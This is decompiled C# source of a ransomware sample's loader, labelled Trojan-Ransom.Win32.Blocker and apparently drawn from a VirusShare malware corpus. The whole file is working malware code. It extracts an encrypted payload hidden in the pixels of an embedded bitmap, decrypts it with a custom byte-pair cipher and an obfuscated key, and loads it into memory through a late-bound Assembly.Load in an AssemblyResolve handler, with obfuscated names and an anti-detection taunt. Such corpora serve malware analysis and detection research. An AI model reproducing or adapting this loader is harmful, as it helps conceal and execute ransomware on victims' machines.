// Decompiled with JetBrains decompiler
// Type: asa.My.MyApplication
// Assembly: asa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 08A4DCEF-B1AF-4819-B563-3E9E49F76F93
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.brdi-08899f49ff8ce9a5b4f42ad4d0318509219315cc653bd5ef01f383c2d4079a7d.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace asa.My
{
  [EditorBrowsable(EditorBrowsableState.Never)]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal class MyApplication : WindowsFormsApplicationBase
  {
    public int zero;
    public string fdd;
    private string fdd2;
    private byte[] input;
    private object key;
    [AccessedThroughProperty("jjj")]
    private AppDomain _jjj;

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    [DebuggerHidden]
    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    internal static void Main(string[] Args)
    {
      try
      {
        Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
      }
      finally
      {
      }
      MyProject.Application.Run(Args);
    }

    public object troll(int z, int y) => Operators.SubtractObject(Operators.SubtractObject((object) checked (2 * z), this.key), (object) y);

    public object troll2(int z, int y) => Operators.AddObject(Operators.SubtractObject(this.key, (object) y), (object) z);

    public object meh(int nb) => (object) (nb % 256);

    public bool meuuuuh(int v) => v < this.zero;

    public void jaja(int index, int equal) => this.input[index] = Conversions.ToByte(this.meh(equal));

    public byte[] dcrp()
    {
      int index = 0;
      while (index <= checked (this.input.Length - 2))
      {
        int y = (int) this.input[index];
        int z = (int) this.input[checked (index + 1)];
        string str1 = Conversions.ToString(this.troll(z, y));
        string str2 = Conversions.ToString(this.troll2(z, y));
        while (this.meuuuuh(Conversions.ToInteger(str2)) | this.meuuuuh(Conversions.ToInteger(str1)))
        {
          if (this.meuuuuh(Conversions.ToInteger(str2)))
            str2 = Conversions.ToString(Conversions.ToDouble(str2) + 256.0);
          if (this.meuuuuh(Conversions.ToInteger(str1)))
            str1 = Conversions.ToString(Conversions.ToDouble(str1) + 256.0);
        }
        this.jaja(index, Conversions.ToInteger(str2));
        this.jaja(checked (index + 1), Conversions.ToInteger(str1));
        checked { index += 2; }
      }
      return this.input;
    }

    public object gstr(byte[] bytes) => (object) Encoding.Default.GetString(bytes);

    public byte ssc(char str) => checked ((byte) Strings.Asc(str));

    public byte[] gbyt(string str)
    {
      char[] charArray = str.ToCharArray();
      byte[] numArray = new byte[checked (charArray.Length - 1 + 1)];
      int num = checked (charArray.Length - 1);
      int index = 0;
      while (index <= num)
      {
        numArray[index] = this.ssc(charArray[index]);
        checked { ++index; }
      }
      return numArray;
    }

    public static byte[] rab(string path)
    {
      FileStream fileStream = new FileInfo(path).OpenRead();
      FileInfo fileInfo = new FileInfo(path);
      byte[] array = new byte[checked ((int) (fileInfo.Length - 1L) + 1)];
      fileStream.Read(array, 0, checked ((int) fileInfo.Length));
      fileStream.Dispose();
      return array;
    }

    public char bonjour(int jj) => Strings.Chr(jj);

    public string bts(Bitmap BMP)
    {
      Bitmap bitmap = new Bitmap((Image) BMP, BMP.Width, BMP.Height);
      int num1 = checked (BMP.Height - 1);
      int y = 0;
      string str;
      while (y <= num1)
      {
        int num2 = checked (BMP.Width - 1);
        int x = 0;
        while (x <= num2)
        {
          Color pixel = bitmap.GetPixel(x, y);
          str = str + Conversions.ToString(this.bonjour((int) pixel.R)) + Conversions.ToString(this.bonjour((int) pixel.G)) + Conversions.ToString(this.bonjour((int) pixel.B));
          checked { ++x; }
        }
        checked { ++y; }
      }
      return str;
    }

    public void exetostr() => this.fdd = this.bts(asa.My.Resources.Resources.fffffff);

    public object unknown(bool pos)
    {
      int index;
      switch (pos)
      {
        case false:
          index = 4;
          break;
        case true:
          index = 1;
          break;
      }
      return (object) MyApplication.spt(this.fdd, this.fdd2)[index];
    }

    public static string[] spt(
      string Expression,
      string Delimiter = " ",
      int Limit = -1,
      CompareMethod Compare = CompareMethod.Binary)
    {
      try
      {
        switch (Expression)
        {
          case "":
          case null:
            return new string[1]{ "" };
          default:
            if (Limit == -1)
              Limit = checked (Expression.Length + 1);
            if ((Delimiter == null ? 0 : Delimiter.Length) != 0)
              return Strings.Split(Expression, Delimiter, Limit, Compare);
            return new string[1]{ Expression };
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        throw ex;
      }
    }

    public virtual AppDomain jjj
    {
      get => this._jjj;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ResolveEventHandler resolveEventHandler = (ResolveEventHandler) ((a0, a1) => (Assembly) this.yyy(RuntimeHelpers.GetObjectValue(a0), a1));
        if (this._jjj != null)
          this._jjj.AssemblyResolve -= resolveEventHandler;
        this._jjj = value;
        if (this._jjj == null)
          return;
        this._jjj.AssemblyResolve += resolveEventHandler;
      }
    }

    public object yyy(object sender, ResolveEventArgs args)
    {
label_0:
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.exetostr();
label_2:
        num3 = 3;
        this.input = this.gbyt(Conversions.ToString(this.unknown(true)));
label_3:
        num3 = 4;
        this.key = RuntimeHelpers.GetObjectValue(this.unknown(false));
label_4:
        num3 = 5;
        byte[] numArray = this.dcrp();
label_5:
        num3 = 6;
        obj1 = this.tt((object) numArray);
        goto label_12;
label_7:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public object tt(object obj)
    {
      System.Type Type = typeof (Assembly);
      object[] objArray = new object[1]
      {
        RuntimeHelpers.GetObjectValue(obj)
      };
      object[] Arguments = objArray;
      bool[] flagArray = new bool[1]{ true };
      bool[] CopyBack = flagArray;
      object obj1 = NewLateBinding.LateGet((object) null, Type, "Load", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
      if (!flagArray[0])
        return obj1;
      obj = RuntimeHelpers.GetObjectValue(objArray[0]);
      return obj1;
    }

    [DebuggerStepThrough]
    public MyApplication()
      : base(AuthenticationMode.Windows)
    {
      this.zero = 0;
      this.fdd2 = "$7$X$0$Z$$$x$$q$$5$fJ$aB$8$y$6$J$$4$h$b$u$Z".Replace("$", (string) null).Replace("you should find better things to detect seriously", (string) null);
      this.jjj = AppDomain.CurrentDomain;
      this.IsSingleInstance = false;
      this.EnableVisualStyles = true;
      this.SaveMySettingsOnExit = true;
      this.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
    }

    [DebuggerStepThrough]
    protected override void OnCreateMainForm() => this.MainForm = (Form) MyProject.Forms.Form2;
  }
}
